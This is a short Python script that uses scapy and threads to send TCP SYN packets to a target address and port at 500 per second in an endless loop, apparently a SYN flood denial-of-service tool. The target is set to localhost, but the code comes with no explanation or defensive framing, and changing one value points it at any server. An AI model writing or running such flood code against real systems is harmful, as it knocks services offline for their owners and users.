from scapy.all import *
from threading import Thread

target_ip = "127.0.0.1"
target_port = 8000
requests_per_second = 500

def send_syn(target_ip, target_port):
    syn_packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(syn_packet)

while True:
    for i in range(requests_per_second):
        t = Thread(target=send_syn, args=(target_ip, target_port))
        t.start()
    time.sleep(1)
